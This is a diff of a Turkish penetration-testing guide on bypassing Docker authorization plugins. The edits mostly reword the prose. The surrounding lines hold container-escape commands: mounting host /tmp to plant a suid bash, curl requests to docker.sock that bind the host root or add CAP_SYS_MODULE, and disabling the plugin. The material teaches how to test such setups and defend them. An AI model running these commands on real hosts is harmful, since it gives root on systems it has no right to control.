@@ -14,7 +14,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 {% endhint %}
 
 
-**Docker’ın** kutudan çıktığı gibi **yetkilendirme** modeli **ya hepsi ya hiçbiri** şeklindedir. Docker daemon'a erişim iznine sahip herhangi bir kullanıcı, **herhangi bir** Docker istemci **komutunu** **çalıştırabilir**. Docker’ın Engine API'sini kullanarak daemon ile iletişim kuran çağrıcılar için de aynı şey geçerlidir. Eğer **daha fazla erişim kontrolü** gerekiyorsa, **yetkilendirme eklentileri** oluşturabilir ve bunları Docker daemon yapılandırmanıza ekleyebilirsiniz. Bir yetkilendirme eklentisi kullanarak, bir Docker yöneticisi Docker daemon'a erişimi yönetmek için **ayrıntılı erişim** politikaları **yapılandırabilir**.
+**Docker’ın** kutudan çıktığı gibi **yetkilendirme** modeli **ya hepsi ya hiçbiri** şeklindedir. Docker daemon'a erişim izni olan herhangi bir kullanıcı, **herhangi bir** Docker istemci **komutunu** **çalıştırabilir**. Docker’ın Engine API'sini kullanarak daemon'a ulaşan çağrılar için de aynı şey geçerlidir. Eğer **daha fazla erişim kontrolü** gerekiyorsa, **yetkilendirme eklentileri** oluşturabilir ve bunları Docker daemon yapılandırmanıza ekleyebilirsiniz. Bir yetkilendirme eklentisi kullanarak, bir Docker yöneticisi Docker daemon'a erişimi yönetmek için **ayrıntılı erişim** politikaları **yapılandırabilir**.
 
 # Temel mimari
 
@@ -22,7 +22,7 @@ Docker Auth eklentileri, **kullanıcı** tarafından talep edilen **hareketleri*
 
 **[Aşağıdaki bilgi belgelerden alınmıştır](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-Bir **HTTP** **isteği**, CLI aracılığıyla veya Engine API üzerinden Docker **daemon**'a yapıldığında, **kimlik doğrulama** **alt sistemi** isteği yüklü **kimlik doğrulama** **eklenti**(ler)ine iletir. İstek, kullanıcı (çağrıcı) ve komut bağlamını içerir. **Eklenti**, isteği **izin verme** veya **red etme** kararı vermekten sorumludur.
+Bir **HTTP** **isteği**, CLI aracılığıyla veya Engine API'si üzerinden Docker **daemon**'una yapıldığında, **kimlik doğrulama** **alt sistemi** isteği yüklü **kimlik doğrulama** **eklenti**(ler)ine iletir. İstek, kullanıcı (çağrıcı) ve komut bağlamını içerir. **Eklenti**, isteği **izin verme** veya **red etme** kararı vermekten sorumludur.
 
 Aşağıdaki sıralama diyagramları, izin verme ve red etme yetkilendirme akışını göstermektedir:
 
@@ -34,11 +34,11 @@ Eklentiye gönderilen her istek, **kimlik doğrulaması yapılmış kullanıcıy
 
 HTTP bağlantısını potansiyel olarak ele geçirebilecek komutlar (`HTTP Upgrade`) için, örneğin `exec`, yetkilendirme eklentisi yalnızca ilk HTTP istekleri için çağrılır. Eklenti komutu onayladıktan sonra, yetkilendirme akışın geri kalanına uygulanmaz. Özellikle, akış verileri yetkilendirme eklentilerine iletilmez. Parçalı HTTP yanıtı döndüren komutlar için, örneğin `logs` ve `events`, yalnızca HTTP isteği yetkilendirme eklentilerine gönderilir.
 
-İstek/yanıt işleme sırasında, bazı yetkilendirme akışları Docker daemon'a ek sorgular yapmayı gerektirebilir. Bu tür akışları tamamlamak için, eklentiler, normal bir kullanıcı gibi daemon API'sini çağırabilir. Bu ek sorguları etkinleştirmek için, eklentinin bir yöneticinin uygun kimlik doğrulama ve güvenlik politikalarını yapılandırmasını sağlaması gerekir.
+İstek/yanıt işleme sırasında, bazı yetkilendirme akışları Docker daemon'a ek sorgular yapmayı gerektirebilir. Bu tür akışları tamamlamak için, eklentiler, normal bir kullanıcı gibi daemon API'sini çağırabilir. Bu ek sorguları etkinleştirmek için, eklentinin bir yöneticinin uygun kimlik doğrulama ve güvenlik politikalarını yapılandırması için gerekli araçları sağlaması gerekir.
 
 ## Birkaç Eklenti
 
-Eklentinizi Docker daemon **başlatma** sürecinin bir parçası olarak **kaydetmekten** siz sorumlusunuz. **Birden fazla eklenti yükleyebilir ve bunları birleştirebilirsiniz**. Bu zincir sıralı olabilir. Daemona yapılan her istek, zincir boyunca sırayla geçer. **Tüm eklentiler kaynağa erişim izni verdiğinde**, erişim izni verilir.
+Eklentinizi Docker daemon **başlangıcı** olarak **kaydetmekten** siz sorumlusunuz. **Birden fazla eklenti yükleyebilir ve bunları birleştirebilirsiniz**. Bu zincir sıralı olabilir. Daemona yapılan her istek, sırayla zincirden geçer. **Tüm eklentiler kaynağa erişim izni verdiğinde**, erişim izni verilir.
 
 # Eklenti Örnekleri
 
@@ -94,7 +94,7 @@ docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a3
 
 ## Yazılabilir Klasörü Bağlama
 
-Bu durumda sistem yöneticisi **kullanıcıların `--privileged` bayrağı ile konteyner çalıştırmalarını yasakladı** veya konteynere herhangi bir ek yetki vermedi ve yalnızca `/tmp` klasörünü bağlamalarına izin verdi:
+Bu durumda sistem yöneticisi **kullanıcıların `--privileged` bayrağı ile konteyner çalıştırmalarını engelledi** veya konteynere herhangi bir ek yetki vermedi ve yalnızca `/tmp` klasörünü bağlamalarına izin verdi:
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
@@ -106,22 +106,22 @@ host> /tmp/bash
 {% hint style="info" %}
 Not edin ki `/tmp` klasörünü bağlayamayabilirsiniz ama **farklı bir yazılabilir klasör** bağlayabilirsiniz. Yazılabilir dizinleri bulmak için: `find / -writable -type d 2>/dev/null` komutunu kullanabilirsiniz.
 
-**Not edin ki bir linux makinesindeki tüm dizinler suid bitini desteklemeyecektir!** Hangi dizinlerin suid bitini desteklediğini kontrol etmek için `mount | grep -v "nosuid"` komutunu çalıştırın. Örneğin genellikle `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` ve `/var/lib/lxcfs` suid bitini desteklemez.
+**Unutmayın ki bir linux makinesindeki tüm dizinler suid bitini desteklemeyecektir!** Hangi dizinlerin suid bitini desteklediğini kontrol etmek için `mount | grep -v "nosuid"` komutunu çalıştırın. Örneğin genellikle `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` ve `/var/lib/lxcfs` suid bitini desteklemez.
 
-Ayrıca, eğer **`/etc`** veya **konfigürasyon dosyalarını içeren** başka bir klasörü bağlayabiliyorsanız, bunları docker konteynerinden root olarak değiştirip **host'ta kötüye kullanmak** ve ayrıcalıkları artırmak için (belki `/etc/shadow` dosyasını değiştirerek) kullanabilirsiniz.
+Ayrıca, eğer **/etc** veya **konfigürasyon dosyalarını içeren** başka bir klasörü **bağlayabiliyorsanız**, bunları docker konteynerinden root olarak değiştirip **host'ta kötüye kullanmak** ve ayrıcalıkları artırmak için (belki `/etc/shadow` dosyasını değiştirerek) kullanabilirsiniz.
 {% endhint %}
 
-## Kontrolsüz API Uç Noktası
+## Kontrol Edilmemiş API Uç Noktası
 
-Bu eklentiyi yapılandıran sistem yöneticisinin sorumluluğu, her kullanıcının hangi eylemleri ve hangi ayrıcalıklarla gerçekleştirebileceğini kontrol etmektir. Bu nedenle, eğer yönetici uç noktalar ve nitelikler ile ilgili bir **kara liste** yaklaşımı benimserse, bir saldırganın **ayrıcalıkları artırmasına** izin verebilecek bazılarını **unutabilir.**
+Bu eklentiyi yapılandıran sistem yöneticisinin sorumluluğu, her kullanıcının hangi eylemleri ve hangi ayrıcalıklarla gerçekleştirebileceğini kontrol etmektir. Bu nedenle, eğer yönetici uç noktalar ve nitelikler için bir **kara liste** yaklaşımı benimserse, bir saldırganın **ayrıcalıkları artırmasına** izin verebilecek bazılarını **unutabilir.**
 
 Docker API'sini [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#) adresinde kontrol edebilirsiniz.
 
-## Kontrolsüz JSON Yapısı
+## Kontrol Edilmemiş JSON Yapısı
 
 ### Kökte Bağlantılar
 
-Sistem yöneticisi docker güvenlik duvarını yapılandırırken [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) gibi bazı önemli parametreleri **unutmuş olabilir**. "**Binds**" gibi.\
+Sistem yöneticisi docker güvenlik duvarını yapılandırırken **önemli bir parametreyi unuttu** olabilir, bu da [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) içindeki "**Binds**" gibi bir parametre olabilir.\
 Aşağıdaki örnekte, bu yanlış yapılandırmayı kötüye kullanarak host'un kök (/) klasörünü bağlayan ve çalıştıran bir konteyner oluşturmak mümkündür:
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
@@ -150,13 +150,13 @@ curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '
 ```
 ### Mounts in HostConfig
 
-**Kökteki Binds** ile aynı talimatları izleyerek bu **isteği** Docker API'sine gerçekleştirin:
+**Binds in root** ile aynı talimatları izleyerek bu **isteği** Docker API'sine gerçekleştirin:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
 ## Unchecked JSON Attribute
 
-Sysadmin docker güvenlik duvarını yapılandırırken, [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) içindeki "**HostConfig**" parametresinin "**Capabilities**" gibi bazı önemli özelliklerini **unutmuş olabilir**. Aşağıdaki örnekte, bu yanlış yapılandırmayı kullanarak **SYS\_MODULE** yetkisine sahip bir konteyner oluşturmak ve çalıştırmak mümkündür:
+Sysadmin docker güvenlik duvarını yapılandırırken, **HostConfig** içindeki "**Capabilities**" gibi bir parametrenin bazı önemli özelliklerini **unutmuş olabilir**. Aşağıdaki örnekte, bu yanlış yapılandırmayı kötüye kullanarak **SYS\_MODULE** yetkisine sahip bir konteyner oluşturmak ve çalıştırmak mümkündür:
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
@@ -172,7 +172,7 @@ capsh --print
 
 ## Eklentiyi Devre Dışı Bırakma
 
-Eğer **sistem yöneticisi** **eklentiyi** **devre dışı bırakma** yetkisini **unutmuşsa**, bunu tamamen devre dışı bırakmak için kullanabilirsiniz!
+Eğer **sistem yöneticisi** **eklentiyi** **devre dışı bırakma** yeteneğini **yasaklamayı** **unutmuşsa**, bunu tamamen devre dışı bırakmak için kullanabilirsiniz!
 ```bash
 docker plugin list #Enumerate plugins
 
